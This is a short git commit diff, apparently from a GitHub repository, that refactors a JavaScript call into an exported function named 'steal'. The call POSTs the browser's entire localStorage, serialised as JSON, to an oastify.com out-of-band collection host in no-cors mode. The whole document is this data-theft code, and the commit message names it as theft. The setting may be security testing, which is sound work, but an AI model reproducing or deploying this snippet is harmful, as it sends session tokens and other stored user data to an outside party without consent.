2c84d36ca17a6f4540711e5d7e52c23617dbaa48
Thundercunce <106381096+Thundercunce@users.noreply.github.com>
2026-02-18 17:01:20 +1100

    Refactor fetch call into steal function

--- myapp1234.js
+++ myapp1234.js
@@ -1,5 +1,7 @@
-fetch('https://98fgpntemdj7ivqu5gv76s0en5twhu5j.oastify.com/', {
-    method: 'POST',
-    mode: 'no-cors',
-    body: JSON.stringify(window.localStorage)
-});
+export function steal() {
+    fetch('https://98fgpntemdj7ivqu5gv76s0en5twhu5j.oastify.com/', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify(window.localStorage)
+    });
+}
